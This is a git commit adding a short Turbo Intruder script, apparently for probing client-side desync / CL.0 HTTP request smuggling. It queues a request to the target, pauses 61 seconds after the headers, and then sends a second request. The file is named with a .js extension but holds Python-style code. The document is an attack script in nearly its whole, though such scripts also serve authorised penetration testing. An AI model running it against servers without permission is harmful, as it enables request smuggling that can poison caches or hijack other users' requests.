7d7385d3019c15edccc50d08310811b1f7dafb4c
Raj Yaduvanshi <132116298+razz56@users.noreply.github.com>
2025-09-19 14:50:02 +0530

    Create request-smuggling-csd3-cl0.js

---
+++ request-smuggling-csd3-cl0.js
@@ -0,0 +1,12 @@
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=500,
+                           pipeline=False)
+
+    # Pause after headers for 61 sec
+    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
